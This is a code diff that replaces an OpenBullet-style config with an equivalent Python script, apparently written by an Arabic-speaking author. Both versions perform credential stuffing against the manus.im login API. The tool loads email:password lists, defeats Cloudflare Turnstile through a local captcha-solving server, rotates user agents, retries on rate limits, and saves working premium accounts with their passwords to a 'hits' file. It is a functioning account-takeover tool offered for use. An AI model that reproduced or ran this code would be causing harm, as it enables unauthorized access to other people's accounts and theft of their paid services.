@@ -1,240 +1,166 @@
-BLOCK:SolveCloudflareTurnstileCaptcha
-DISABLED
-LABEL:ENABLE IF YOU WANT TO USE PAID CAPTCHA SERVICE
-  siteKey = "0x4AAAAAAA_sd0eRNCinWBgU"
-  siteUrl = "https%3A%2F%2Fmanus.im%2F"
-  => VAR @yeat
-ENDBLOCK
+import requests
+import json
+import random
+import sys
+import time
+import os
 
-string _ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
-data.LogVariableAssignment(nameof(_ua));
+# ==========================================
+# ⚙️ الإعدادات الأساسية
+# ==========================================
+# رابط سيرفر الكابتشا (إذا كان يعمل على نفس الجهاز)
+CAPTCHA_SOLVER_URL = "http://127.0.0.1:6767/solve?url=https%3A%2F%2Fmanus.im%2F&sitekey=0x4AAAAAAA_sd0eRNCinWBgU"
 
-data.UseProxy = false;
+# الملف الذي يحتوي على الإيميلات والباسوردات
+INPUT_FILE = "accounts.txt"
 
-BLOCK:HttpRequest
-LABEL:ts
-  url = "http://127.0.0.1:6767/solve?url=https%3A%2F%2Fmanus.im%2F&sitekey=0x4AAAAAAA_sd0eRNCinWBgU"
-  httpLibrary = SystemNet
-  timeoutMilliseconds = 90000
-  TYPE:STANDARD
-  ""
-  ""
-ENDBLOCK
+# الألوان لطباعة النتائج
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+RESET = '\033[0m'
 
-data.UseProxy = true;
+def get_user_agent():
+    mac_versions = ["10_15_7", "11_0", "12_0", "13_0", "14_0"]
+    chrome_versions = ["120.0.0.0", "122.0.0.0", "125.0.0.0", "128.0.0.0"]
+    mv = random.choice(mac_versions)
+    cv = random.choice(chrome_versions)
+    return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36"
 
-BLOCK:Keycheck
-LABEL:kts
-  banIfNoMatch = False
-  KEYCHAIN RETRY OR
-    STRINGKEY @data.SOURCE Contains "\"success\":false"
-    STRINGKEY @data.SOURCE Contains "\"success\": false"
-    STRINGKEY @data.RESPONSECODE DoesNotContain "200"
-ENDBLOCK
+def solve_captcha():
+    try:
+        # في حال كنت تستخدم 2Captcha أو غيره، تقوم بتعديل هذا الجزء
+        response = requests.get(CAPTCHA_SOLVER_URL, timeout=90)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("success") and "token" in data:
+                return data["token"]
+        return None
+    except Exception as e:
+        return None
 
-BLOCK:Parse
-LABEL:pts
-  input = @data.SOURCE
-  leftDelim = "\"token\":\""
-  rightDelim = "\""
-  MODE:LR
-  => VAR @_q1
-ENDBLOCK
+def check_account(email, password):
+    ua = get_user_agent()
+    session = requests.Session()
+    
+    headers_base = {
+        "User-Agent": ua,
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Referer": "https://manus.im/",
+        "Connect-Protocol-Version": "1",
+        "X-Client-Id": "oOyiiFQN6teedeGBWvq6ec",
+        "X-Client-Locale": "en-GB",
+        "X-Client-Timezone": "Europe/London",
+        "X-Client-Timezone-Offset": "0",
+        "X-Client-Type": "web",
+        "Origin": "https://manus.im"
+    }
 
-BLOCK:Keycheck
-LABEL:kts2
-  banIfNoMatch = False
-  KEYCHAIN RETRY OR
-    STRINGKEY @_q1 EqualTo ""
-ENDBLOCK
+    # 1. حل الكابتشا
+    print(f"[{email}] جاري حل الكابتشا...")
+    cf_token = solve_captcha()
+    if not cf_token:
+        return {"status": "ERROR", "msg": "فشل حل الكابتشا (تأكد من تشغيل السيرفر)"}
 
-BLOCK:HttpRequest
-LABEL:r1
-  url = "https://api.manus.im/user.v1.UserAuthPublicService/GetUserPlatforms"
-  method = POST
-  httpLibrary = SystemNet
-  securityProtocol = TLS12
-  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=0")}
-  TYPE:STANDARD
-  $"{\"email\":\"<input.USER>\",\"cfCaptchaCode\":\"<_q1>\"}"
-  "application/json"
-ENDBLOCK
+    # 2. GetUserPlatforms
+    headers = headers_base.copy()
+    url = "https://api.manus.im/user.v1.UserAuthPublicService/GetUserPlatforms"
+    payload = {"email": email, "cfCaptchaCode": cf_token}
+    
+    try:
+        res = session.post(url, headers=headers, json=payload, timeout=30)
+        if res.status_code != 200:
+            return {"status": "ERROR", "msg": f"فشل الاتصال الأول: {res.status_code}"}
+            
+        data = res.json()
+        temp_token = data.get("tempToken")
+        if not temp_token:
+            return {"status": "BAD", "msg": "لم يتم العثور على tempToken (ربما الإيميل غير مسجل)"}
 
-BLOCK:Keycheck
-LABEL:k1
-  banIfNoMatch = False
-  KEYCHAIN RETRY OR
-    STRINGKEY @data.RESPONSECODE EqualTo "403"
-    STRINGKEY @data.RESPONSECODE EqualTo "429"
-    STRINGKEY @data.SOURCE Contains "captcha"
-    STRINGKEY @data.SOURCE Contains "too many"
-    STRINGKEY @data.SOURCE Contains "rate limit"
-  KEYCHAIN FAIL OR
-    STRINGKEY @data.RESPONSECODE EqualTo "400"
-    STRINGKEY @data.RESPONSECODE EqualTo "401"
-    STRINGKEY @data.RESPONSECODE EqualTo "404"
-ENDBLOCK
+    except Exception as e:
+        return {"status": "ERROR", "msg": f"خطأ بالشبكة: {str(e)}"}
 
-BLOCK:Parse
-LABEL:p2
-  input = @data.SOURCE
-  leftDelim = "\"tempToken\":\""
-  rightDelim = "\""
-  MODE:LR
-  => VAR @_q2
-ENDBLOCK
+    # 3. LoginByEmail
+    url_login = "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail"
+    payload_login = {"email": email, "password": password, "token": temp_token}
+    
+    try:
+        res_login = session.post(url_login, headers=headers, json=payload_login, timeout=30)
+        data_login = res_login.json()
+        
+        if "token" not in data_login:
+            return {"status": "BAD", "msg": "الباسورد خاطئ أو الحساب محظور"}
+            
+        auth_token = data_login["token"]
+        
+    except Exception as e:
+        return {"status": "ERROR", "msg": f"خطأ في تسجيل الدخول: {str(e)}"}
 
-BLOCK:Keycheck
-LABEL:k_q2
-  banIfNoMatch = False
-  KEYCHAIN RETRY OR
-    STRINGKEY @_q2 EqualTo ""
-ENDBLOCK
+    # 4. GetAvailableCredits
+    url_credits = "https://api.manus.im/user.v1.UserService/GetAvailableCredits"
+    headers_auth = headers.copy()
+    headers_auth["Authorization"] = f"Bearer {auth_token}"
+    headers_auth["Priority"] = "u=4"
+    
+    try:
+        res_credits = session.post(url_credits, headers=headers_auth, json={}, timeout=30)
+        credits_data = res_credits.json()
+        credits = credits_data.get("totalCredits", "Unknown")
+        
+        if res_credits.status_code == 403:
+            return {"status": "BAN", "msg": "الحساب محظور (Blocked)"}
+    except:
+        credits = "Unknown"
 
-BLOCK:HttpRequest
-LABEL:r2
-  url = "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail"
-  method = POST
-  httpLibrary = SystemNet
-  securityProtocol = TLS12
-  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("X-Client-Dcr", "hbM4BVL9Ln4yhpoveJHyQV7zLFkAdZ8ne6gcLH8XLGHzOmD0LIgsemB3RbE7QmT0LKM5RmH3QV7zNVEKCZQueb1bPGHzPGHzPVEJdAMoCp27OcH3QV7zLlzleJ2mBZaoLmrlCZ7lOFMvBZ8qgZIqCAPlRovlCZ7wYYPlOFMoelMgOFM3dZ4ohp2xCVL9LnIcdZHyUJkkd5HlOFMpC4MofAYof6UMCFL9LlLvLpQmfpYoelL9hbM6dZU3dFL9PmX5PFzldJYsC5k3LmraQGTziVzlgpoog6EyfqTlRqvlg5ongJjlRmL4QmDvLpkodZgrgFL9PWPzQ63vLqUseZYcgJIwfFL9PWf5QGH4RGn7QcDzRFzlgJowCAsyepYSCpCcCATlRl3cQmE2"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=0")}
-  TYPE:STANDARD
-  $"{\"email\":\"<input.USER>\",\"password\":\"<input.PASS>\",\"token\":\"<_q2>\"}"
-  "application/json"
-ENDBLOCK
+    # 5. UserInfo
+    url_info = "https://api.manus.im/user.v1.UserService/UserInfo"
+    try:
+        res_info = session.post(url_info, headers=headers_auth, json={}, timeout=30)
+        info_data = res_info.json()
+        membership = info_data.get("membershipVersion", "Unknown")
+        user_type = info_data.get("userType", "Unknown")
+        task_limit = info_data.get("concurrentScheduleTaskLimit", "Unknown")
+    except:
+        membership, user_type, task_limit = "Unknown", "Unknown", "Unknown"
 
-BLOCK:Keycheck
-LABEL:k2
-  banIfNoMatch = False
-  KEYCHAIN RETRY OR
-    STRINGKEY @data.RESPONSECODE EqualTo "403"
-    STRINGKEY @data.RESPONSECODE EqualTo "429"
-    STRINGKEY @data.SOURCE Contains "captcha"
-    STRINGKEY @data.SOURCE Contains "too many"
-    STRINGKEY @data.SOURCE Contains "rate limit"
-  KEYCHAIN FAIL OR
-    STRINGKEY @data.SOURCE Contains "ErrorDetail"
-    STRINGKEY @data.SOURCE Contains "Password does not match"
-    STRINGKEY @data.SOURCE Contains "\"message\":\"Error\""
-    STRINGKEY @data.RESPONSECODE EqualTo "400"
-    STRINGKEY @data.RESPONSECODE EqualTo "401"
-ENDBLOCK
+    # تحديد نوع الحساب
+    result_str = f"Credits: {credits} | Mem: {membership} | Type: {user_type} | Limits: {task_limit}"
+    
+    # تصنيف: هل الحساب مدفوع أم مجاني؟
+    if "free" in str(membership).lower() or "free" in str(user_type).lower() or str(membership) == "0":
+        return {"status": "FREE", "msg": result_str}
+    else:
+        return {"status": "PREMIUM", "msg": result_str}
 
-BLOCK:Parse
-LABEL:p3
-  input = @data.SOURCE
-  leftDelim = "\"token\":\""
-  rightDelim = "\""
-  MODE:LR
-  => VAR @_q3
-ENDBLOCK
+def main():
+    if not os.path.exists(INPUT_FILE):
+        print(f"{RED}تنبيه: تأكد من وجود ملف باسم {INPUT_FILE} في نفس المجلد وبه الإيميلات والباسوردات (email:pass){RESET}")
+        sys.exit()
 
-BLOCK:Keycheck
-LABEL:k_q3
-  banIfNoMatch = False
-  KEYCHAIN FAIL OR
-    STRINGKEY @_q3 EqualTo ""
-ENDBLOCK
+    with open(INPUT_FILE, "r") as f:
+        accounts = [line.strip() for line in f if ":" in line]
 
-BLOCK:HttpRequest
-LABEL:r3
-  url = "https://api.manus.im/user.v1.UserService/GetAvailableCredits"
-  method = POST
-  httpLibrary = SystemNet
-  securityProtocol = TLS12
-  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("Authorization", "Bearer <_q3>"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=4")}
-  TYPE:STANDARD
-  "{}"
-  "application/json"
-ENDBLOCK
+    print(f"تم تحميل {len(accounts)} حساب. جاري البدء...\n")
 
-BLOCK:Parse
-LABEL:p_credits
-  input = @data.SOURCE
-  leftDelim = "\"totalCredits\":"
-  rightDelim = ","
-  MODE:LR
-  => VAR @_q4
-ENDBLOCK
+    for acc in accounts:
+        parts = acc.split(":", 1)
+        email, pwd = parts[0], parts[1]
+        
+        result = check_account(email, pwd)
+        
+        if result["status"] == "PREMIUM":
+            print(f"{GREEN}[HIT - PREMIUM] {email}:{pwd} -> {result['msg']}{RESET}")
+            with open("premium_hits.txt", "a") as out:
+                out.write(f"{email}:{pwd} | {result['msg']}\n")
+        elif result["status"] == "FREE":
+            print(f"{YELLOW}[FREE] {email}:{pwd} -> {result['msg']}{RESET}")
+        elif result["status"] == "BAN":
+            print(f"{RED}[BANNED] {email}:{pwd} -> {result['msg']}{RESET}")
+        else:
+            print(f"[BAD/ERROR] {email} -> {result['msg']}")
+            
+        time.sleep(1) # تأخير بسيط بين الحسابات
 
-BLOCK:Keycheck
-LABEL:k3
-  banIfNoMatch = False
-  KEYCHAIN DEAD OR
-    STRINGKEY @data.RESPONSECODE EqualTo "403"
-  KEYCHAIN RETRY OR
-    STRINGKEY @data.RESPONSECODE EqualTo "429"
-    STRINGKEY @data.RESPONSECODE EqualTo "500"
-    STRINGKEY @data.RESPONSECODE EqualTo "502"
-  KEYCHAIN FAIL OR
-    STRINGKEY @data.RESPONSECODE EqualTo "401"
-ENDBLOCK
-
-BLOCK:HttpRequest
-LABEL:r4
-  url = "https://api.manus.im/user.v1.UserService/UserInfo"
-  method = POST
-  httpLibrary = SystemNet
-  securityProtocol = TLS12
-  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("Authorization", "Bearer <_q3>"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=4")}
-  TYPE:STANDARD
-  "{}"
-  "application/json"
-ENDBLOCK
-
-BLOCK:Parse
-LABEL:p_membership
-  input = @data.SOURCE
-  leftDelim = "\"membershipVersion\":\""
-  rightDelim = "\""
-  MODE:LR
-  => VAR @_q5
-ENDBLOCK
-
-BLOCK:Parse
-LABEL:p_usertype
-  input = @data.SOURCE
-  leftDelim = "\"userType\":\""
-  rightDelim = "\""
-  MODE:LR
-  => VAR @_q6
-ENDBLOCK
-
-BLOCK:Parse
-LABEL:p_tasklimit
-  input = @data.SOURCE
-  leftDelim = "\"concurrentScheduleTaskLimit\":"
-  rightDelim = ","
-  MODE:LR
-  => VAR @_q7
-ENDBLOCK
-
-BLOCK:Keycheck
-LABEL:k4
-  banIfNoMatch = False
-  KEYCHAIN DEAD OR
-    STRINGKEY @data.RESPONSECODE EqualTo "403"
-  KEYCHAIN SUCCESS OR
-    STRINGKEY @_q5 DoesNotContain "free"
-    STRINGKEY @_q6 DoesNotContain "free"
-    STRINGKEY @_q5 DoesNotContain "0"
-  KEYCHAIN CUSTOM OR
-    STRINGKEY @_q5 Contains "free"
-    STRINGKEY @_q6 Contains "free"
-    STRINGKEY @_q5 Contains "0"
-  KEYCHAIN FAIL OR
-    STRINGKEY @data.RESPONSECODE EqualTo "400"
-    STRINGKEY @data.RESPONSECODE EqualTo "401"
-ENDBLOCK
-
-BLOCK:ConstantString
-LABEL:out1
-  value = $"Credits: <_q4> | Membership: <_q5> | UserType: <_q6> | TaskLimits: <_q7>"
-  => CAP @info
-ENDBLOCK
-
-BLOCK:ConstantString
-LABEL:out2
-  value = "@YeatTheLegit"
-  => CAP @by
-ENDBLOCK
+if __name__ == "__main__":
+    main()
